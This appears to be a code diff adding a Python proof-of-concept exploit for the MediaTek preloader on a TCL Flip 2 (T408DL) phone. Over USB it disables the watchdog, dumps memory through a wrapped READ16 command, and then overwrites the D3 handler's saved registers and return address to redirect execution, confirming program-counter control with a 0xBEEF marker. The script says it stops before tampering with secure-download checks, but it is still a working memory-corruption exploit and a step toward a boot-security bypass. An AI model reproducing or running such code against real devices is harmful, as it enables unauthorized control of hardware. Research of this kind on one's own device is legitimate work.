@@ -1,0 +1,392 @@
+#!/usr/bin/env python3
+"""Bounded Stage 3B PC-control proof for TCL Flip 2 / T408DL.
+
+Does NOT modify S-USBDL or g_da_verified, does NOT SEND_DA/JUMP_DA,
+and does not write flash/storage. It performs one volatile watchdog MMIO
+WRITE32 and one bounded D3 replay ending at the D3 saved LR.
+"""
+
+from __future__ import annotations
+import sys
+import time
+import T408DL_preloader_catcher as stage1
+
+EXPECTED_HW_CODE = 0x0699
+CMD_READ16 = 0xD0
+CMD_WRITE16_NO_ECHO = 0xD3
+CMD_WRITE32 = 0xD4
+WDT_ADDR = 0x10007000
+WDT_VALUE = 0x22000064
+BEEF_GADGET = 0x00202B09
+READ16_NORMAL_LR = 0x00202B17
+D3_BASE_SLOT  = 0x000C0AAC
+D3_COUNT_SLOT = 0x000C0AB0
+D3_SAVE_R4    = 0x000C0AB8
+D3_SAVE_R5    = 0x000C0ABC
+D3_SAVE_R6    = 0x000C0AC0
+D3_SAVE_R7    = 0x000C0AC4
+D3_SAVE_LR    = 0x000C0AC8
+D3_FRAME_END  = D3_SAVE_LR + 4
+D0_SAVE_R4 = 0x000C0ABC
+D0_SAVE_R5 = 0x000C0AC0
+D0_SAVE_R6 = 0x000C0AC4
+D0_SAVE_LR = 0x000C0AC8
+USB_TIMEOUT_MS = 2000
+STREAM_CHUNK = 0x200
+PROGRESS_STEP = 0x10000
+
+
+def stamp():
+    try:
+        return f"{stage1.ts():.6f}"
+    except Exception:
+        return f"{time.monotonic():.6f}"
+
+
+def read_exact(ep_in, size, timeout_ms=USB_TIMEOUT_MS):
+    out = bytearray()
+    while len(out) < size:
+        chunk = bytes(ep_in.read(size - len(out), timeout_ms))
+        if not chunk:
+            raise RuntimeError(f"USB returned zero bytes at 0x{len(out):X}/0x{size:X}")
+        out += chunk
+    return bytes(out)
+
+
+def echo_bytes(ep_out, ep_in, data):
+    data = bytes(data)
+    ep_out.write(data, USB_TIMEOUT_MS)
+    got = read_exact(ep_in, len(data))
+    if got != data:
+        raise RuntimeError(f"Echo mismatch: TX={data.hex()} RX={got.hex()}")
+    return got
+
+
+def rword(ep_in):
+    return int.from_bytes(read_exact(ep_in, 2), "big")
+
+
+def write32_mtk(ep_out, ep_in, address, value):
+    print(f"[{stamp()}] WRITE32 addr=0x{address:08X} value=0x{value:08X}")
+    echo_bytes(ep_out, ep_in, bytes([CMD_WRITE32]))
+    echo_bytes(ep_out, ep_in, address.to_bytes(4, "big"))
+    echo_bytes(ep_out, ep_in, (1).to_bytes(4, "big"))
+    initial = rword(ep_in)
+    print(f"  initial status = 0x{initial:04X}")
+    if initial > 0x0003:
+        raise RuntimeError(f"WRITE32 initial status failure: 0x{initial:04X}")
+    echo_bytes(ep_out, ep_in, value.to_bytes(4, "big"))
+    final = rword(ep_in)
+    print(f"  final status   = 0x{final:04X}")
+    if final > 0x00FF:
+        raise RuntimeError(f"WRITE32 final status failure: 0x{final:04X}")
+
+
+def disable_watchdog(ep_out, ep_in):
+    print("\n[WDT] Disabling MT6739 watchdog")
+    print(f"  address = 0x{WDT_ADDR:08X}")
+    print(f"  value   = 0x{WDT_VALUE:08X}")
+    write32_mtk(ep_out, ep_in, WDT_ADDR, WDT_VALUE)
+
+
+def wrapped_count_for_low_end(low_end_exclusive):
+    low_end_exclusive = (int(low_end_exclusive) + 1) & ~1
+    return 1 + (low_end_exclusive // 2)
+
+
+def wire_to_low_memory(wire):
+    if len(wire) < 2 or (len(wire) & 1):
+        raise RuntimeError("Invalid wrapped READ16 wire length")
+    src = wire[2:]
+    low = bytearray(len(src))
+    low[0::2] = src[1::2]
+    low[1::2] = src[0::2]
+    return low
+
+
+def low_memory_to_wire(first_halfword, low):
+    if len(first_halfword) != 2:
+        raise ValueError("first_halfword must be 2 bytes")
+    if len(low) & 1:
+        raise ValueError("low-memory replay length must be even")
+    low = bytes(low)
+    be = bytearray(len(low))
+    be[0::2] = low[1::2]
+    be[1::2] = low[0::2]
+    return bytes(first_halfword) + bytes(be)
+
+
+def stream_read(ep_in, total, label):
+    out = bytearray()
+    started = time.monotonic()
+    next_report = PROGRESS_STEP
+    while len(out) < total:
+        want = min(0x4000, total - len(out))
+        try:
+            chunk = bytes(ep_in.read(want, USB_TIMEOUT_MS))
+        except Exception as exc:
+            elapsed = time.monotonic() - started
+            print(f"\n  *** {label} STREAM INTERRUPTED ***")
+            print(f"  received = 0x{len(out):X}/0x{total:X}")
+            print(f"  elapsed  = {elapsed:.3f}s")
+            print(f"  error    = {exc}")
+            raise
+        if not chunk:
+            raise RuntimeError(f"{label} returned zero bytes at 0x{len(out):X}")
+        out += chunk
+        if len(out) >= next_report or len(out) == total:
+            elapsed = time.monotonic() - started
+            pct = len(out) * 100.0 / total
+            print(f"  progress = 0x{len(out):X}/0x{total:X} ({pct:.1f}%, {elapsed:.3f}s)")
+            while next_report <= len(out):
+                next_report += PROGRESS_STEP
+    return bytes(out)
+
+
+def wrapped_d0_snapshot(ep_out, ep_in, low_end_exclusive):
+    low_end_exclusive = (int(low_end_exclusive) + 1) & ~1
+    count = wrapped_count_for_low_end(low_end_exclusive)
+    total = count * 2
+    print("\n[D0] Fresh wrapped READ16 snapshot")
+    print("  start             = 0xFFFFFFFE")
+    print(f"  low end exclusive = 0x{low_end_exclusive:08X}")
+    print(f"  count             = 0x{count:X} halfwords")
+    print(f"  wire bytes        = 0x{total:X}")
+    echo_bytes(ep_out, ep_in, bytes([CMD_READ16]))
+    echo_bytes(ep_out, ep_in, (0xFFFFFFFE).to_bytes(4, "big"))
+    echo_bytes(ep_out, ep_in, count.to_bytes(4, "big"))
+    initial = rword(ep_in)
+    print(f"  initial status    = 0x{initial:04X}")
+    if initial > 0x00FF:
+        raise RuntimeError(f"Wrapped D0 rejected: initial status 0x{initial:04X}")
+    wire = stream_read(ep_in, total, "D0")
+    final = rword(ep_in)
+    print(f"  final status      = 0x{final:04X}")
+    if final > 0x00FF:
+        raise RuntimeError(f"Wrapped D0 final status failure: 0x{final:04X}")
+    low = wire_to_low_memory(wire)
+    if len(low) < low_end_exclusive:
+        raise RuntimeError(f"Decoded snapshot too short: 0x{len(low):X} < 0x{low_end_exclusive:X}")
+    return wire, low, initial, final
+
+
+def u32le(buf, addr):
+    if addr < 0 or addr + 4 > len(buf):
+        raise RuntimeError(f"u32 address outside snapshot: 0x{addr:08X}")
+    return int.from_bytes(buf[addr:addr + 4], "little")
+
+
+def put32le(buf, addr, value):
+    if addr < 0 or addr + 4 > len(buf):
+        raise RuntimeError(f"put32 address outside replay: 0x{addr:08X}")
+    buf[addr:addr + 4] = int(value & 0xFFFFFFFF).to_bytes(4, "little")
+
+
+def validate_fresh_d0_frame(low):
+    d0_lr = u32le(low, D0_SAVE_LR)
+    saved_r4 = u32le(low, D0_SAVE_R4)
+    saved_r5 = u32le(low, D0_SAVE_R5)
+    saved_r6 = u32le(low, D0_SAVE_R6)
+    print("\n[Validate] Fresh D0 frame")
+    print(f"  saved r4 = 0x{saved_r4:08X}")
+    print(f"  saved r5 = 0x{saved_r5:08X}")
+    print(f"  saved r6 = 0x{saved_r6:08X}")
+    print(f"  saved lr = 0x{d0_lr:08X}")
+    if d0_lr != READ16_NORMAL_LR:
+        raise RuntimeError(f"D0 stack signature mismatch: 0x{d0_lr:08X} != 0x{READ16_NORMAL_LR:08X}")
+    if not (0x00200000 <= saved_r4 < 0x00210000):
+        raise RuntimeError("Unexpected handler saved r4")
+    if not (0x00100000 <= saved_r5 < 0x00110000):
+        raise RuntimeError("Unexpected handler saved r5")
+    if not (0x00200000 <= saved_r6 < 0x00210000):
+        raise RuntimeError("Unexpected handler saved r6")
+    return saved_r4, saved_r5, saved_r6
+
+
+def build_d3_pcproof_replay(wire, low):
+    saved_r4, saved_r5, saved_r6 = validate_fresh_d0_frame(low)
+    low_end = D3_FRAME_END
+    count = wrapped_count_for_low_end(low_end)
+    if len(low) < low_end:
+        raise RuntimeError("Fresh snapshot does not include complete D3 frame")
+    replay_low = bytearray(low[:low_end])
+    put32le(replay_low, D3_BASE_SLOT, 0xFFFFFFFE)
+    put32le(replay_low, D3_COUNT_SLOT, count)
+    put32le(replay_low, D3_SAVE_R4, saved_r4)
+    put32le(replay_low, D3_SAVE_R5, saved_r5)
+    put32le(replay_low, D3_SAVE_R6, saved_r6)
+    put32le(replay_low, D3_SAVE_R7, 0x0000BEEF)
+    put32le(replay_low, D3_SAVE_LR, BEEF_GADGET)
+    replay_wire = low_memory_to_wire(wire[:2], replay_low)
+    expected_len = count * 2
+    if len(replay_wire) != expected_len:
+        raise RuntimeError(f"D3 replay geometry mismatch: 0x{len(replay_wire):X} != 0x{expected_len:X}")
+    if len(replay_low) >= 0x0010043C:
+        raise RuntimeError("Replay would reach S-USBDL; refusing")
+    if len(replay_low) >= 0x0010935D:
+        raise RuntimeError("Replay would reach DA gate; refusing")
+    print("\n[Build] D3 PC-control proof replay")
+    print(f"  replay low end = 0x{len(replay_low):08X}")
+    print(f"  wire bytes     = 0x{len(replay_wire):X}")
+    print(f"  D3 count       = 0x{count:X}")
+    print("  saved r7       = 0x0000BEEF")
+    print(f"  saved PC       = 0x{BEEF_GADGET:08X}")
+    print("  S-USBDL        = NOT REACHED")
+    print("  DA gate        = NOT REACHED")
+    return replay_wire
+
+
+def d3_write_replay(ep_out, ep_in, wire):
+    if len(wire) < 4 or (len(wire) & 1):
+        raise RuntimeError("Invalid D3 replay size")
+    count = len(wire) // 2
+    print("\n[D3] WRITE16_NO_ECHO bounded replay")
+    print("  start      = 0xFFFFFFFE")
+    print(f"  count      = 0x{count:X} halfwords")
+    print(f"  wire bytes = 0x{len(wire):X}")
+    echo_bytes(ep_out, ep_in, bytes([CMD_WRITE16_NO_ECHO]))
+    echo_bytes(ep_out, ep_in, (0xFFFFFFFE).to_bytes(4, "big"))
+    echo_bytes(ep_out, ep_in, count.to_bytes(4, "big"))
+    initial = rword(ep_in)
+    print(f"  initial status = 0x{initial:04X}")
+    if initial > 0x00FF:
+        raise RuntimeError(f"D3 initial status failure: 0x{initial:04X}")
+    started = time.monotonic()
+    sent = 0
+    next_report = PROGRESS_STEP
+    while sent < len(wire):
+        block = wire[sent:sent + STREAM_CHUNK]
+        try:
+            written = ep_out.write(block, USB_TIMEOUT_MS)
+        except Exception as exc:
+            elapsed = time.monotonic() - started
+            print("\n  *** D3 STREAM INTERRUPTED ***")
+            print(f"  sent    = 0x{sent:X}/0x{len(wire):X}")
+            print(f"  elapsed = {elapsed:.3f}s")
+            print(f"  error   = {exc}")
+            raise
+        if int(written) != len(block):
+            raise RuntimeError(f"Short D3 USB write at 0x{sent:X}: {written}/{len(block)}")
+        sent += len(block)
+        if sent >= next_report or sent == len(wire):
+            elapsed = time.monotonic() - started
+            pct = sent * 100.0 / len(wire)
+            print(f"  progress = 0x{sent:X}/0x{len(wire):X} ({pct:.1f}%, {elapsed:.3f}s)")
+            while next_report <= sent:
+                next_report += PROGRESS_STEP
+    final = rword(ep_in)
+    print(f"  final status   = 0x{final:04X}")
+    if final > 0x00FF:
+        raise RuntimeError(f"D3 final status failure: 0x{final:04X}")
+    return final
+
+
+def verify_beef_path(ep_in):
+    print("\n[Proof] Waiting for signed-code marker...")
+    marker = rword(ep_in)
+    follow = rword(ep_in)
+    print(f"  marker = 0x{marker:04X}")
+    print(f"  follow = 0x{follow:04X}")
+    if marker != 0xBEEF or follow != 0x0000:
+        raise RuntimeError(f"PC-control proof FAILED: expected BEEF/0000, got {marker:04X}/{follow:04X}")
+    print("  PC-control marker: PASS")
+
+
+def verify_hw_code(ep_out, ep_in):
+    print("\n[Verify] GET_HW_CODE after D3 return")
+    hwcode, hwver = stage1.get_hw_code(ep_out, ep_in)
+    print(f"  HW_CODE = 0x{hwcode:04X}")
+    print(f"  HW_VER  = 0x{hwver:04X}")
+    if hwcode != EXPECTED_HW_CODE:
+        raise RuntimeError(f"Post-proof HW_CODE mismatch: 0x{hwcode:04X}")
+    print("  command loop survived: PASS")
+
+
+def verify_fresh_d0_afterproof(ep_out, ep_in):
+    print("\n[Verify] Fresh wrapped D0 after PC-control proof")
+    _, low, initial, final = wrapped_d0_snapshot(ep_out, ep_in, D3_FRAME_END)
+    if initial != 0x0000 or final != 0x0000:
+        raise RuntimeError(f"Post-proof D0 status mismatch: initial=0x{initial:04X} final=0x{final:04X}")
+    lr = u32le(low, D0_SAVE_LR)
+    print(f"  fresh D0 saved LR = 0x{lr:08X}")
+    if lr != READ16_NORMAL_LR:
+        raise RuntimeError(f"Fresh D0 stack signature mismatch: 0x{lr:08X}")
+    print("  fresh wrapped D0: PASS")
+
+
+def main():
+    print("T408DL_preloader_stage3_pcproof.py")
+    print("Stage 3B: bounded D3 PC-control proof ONLY")
+    print("=" * 68)
+    print("\nSAFETY BOUNDARY:")
+    print("  - no S-USBDL modification")
+    print("  - no g_da_verified modification")
+    print("  - no SEND_DA / JUMP_DA")
+    print("  - no flash/storage writes")
+    print("  - Stage 1 is imported unchanged\n")
+    dev = None
+    try:
+        print("[Stage 1] Waiting for and capturing Preloader...")
+        dev = stage1.wait_for_preloader()
+        print("[Stage 1] Setting up proven USB path...")
+        intf, ep_out, ep_in = stage1.setup_usb(dev)
+        print("[Stage 1] Performing proven MTK synchronization...")
+        stage1.sync_mtk(ep_out, ep_in)
+        print("[Stage 1] Verifying device identity...")
+        hwcode, hwver = stage1.get_hw_code(ep_out, ep_in)
+        if hwcode != EXPECTED_HW_CODE:
+            raise RuntimeError(f"Unexpected HW_CODE 0x{hwcode:04X}; refusing")
+        print("\nStage 1 session: PASS")
+        print(f"  HW_CODE = 0x{hwcode:04X}")
+        print(f"  HW_VER  = 0x{hwver:04X}")
+        disable_watchdog(ep_out, ep_in)
+        wire, low, d0_initial, d0_final = wrapped_d0_snapshot(ep_out, ep_in, D3_FRAME_END)
+        if d0_initial != 0x0000 or d0_final != 0x0000:
+            raise RuntimeError(f"Fresh D0 status mismatch: initial=0x{d0_initial:04X} final=0x{d0_final:04X}")
+        replay = build_d3_pcproof_replay(wire, low)
+        print("\n" + "=" * 68)
+        print("ABOUT TO PERFORM THE ONLY D3 WRITE IN THIS TEST")
+        print("=" * 68)
+        print("Target effect:")
+        print("  saved r7 -> 0x0000BEEF")
+        print(f"  saved PC -> 0x{BEEF_GADGET:08X}")
+        print("The replay ends at the D3 frame and does not reach")
+        print("S-USBDL (0x0010043C) or the DA gate (0x0010935D).\n")
+        final = d3_write_replay(ep_out, ep_in, replay)
+        if final != 0x0000:
+            raise RuntimeError(f"D3 completed with unexpected status 0x{final:04X}")
+        verify_beef_path(ep_in)
+        verify_hw_code(ep_out, ep_in)
+        verify_fresh_d0_afterproof(ep_out, ep_in)
+        print("\n" + "=" * 68)
+        print("STAGE 3B PC-CONTROL PROOF SUCCESS")
+        print("=" * 68)
+        print("Observed requirements:")
+        print("  D3 final status      = 0x0000")
+        print("  signed-code marker   = BEEF/0000")
+        print("  GET_HW_CODE survived = PASS")
+        print("  fresh wrapped D0     = PASS")
+        print("\nNo S-USBDL or DA-gate modification was attempted.")
+        print("No SEND_DA, JUMP_DA, or flash/storage write was attempted.")
+        return 0
+    except KeyboardInterrupt:
+        print("\nInterrupted by user.")
+        return 130
+    except Exception as exc:
+        print("\n" + "=" * 68)
+        print("STAGE 3B ABORTED / FAILED CLOSED")
+        print("=" * 68)
+        print(f"ERROR: {exc}")
+        print("\nDo not infer PC control unless ALL success checks passed.")
+        return 1
+    finally:
+        if dev is not None:
+            print("\nReleasing Preloader USB session...")
+            try:
+                stage1.cleanup(dev)
+            except Exception as exc:
+                print(f"Cleanup warning: {exc}")
+
+
+if __name__ == "__main__":
+    sys.exit(main())
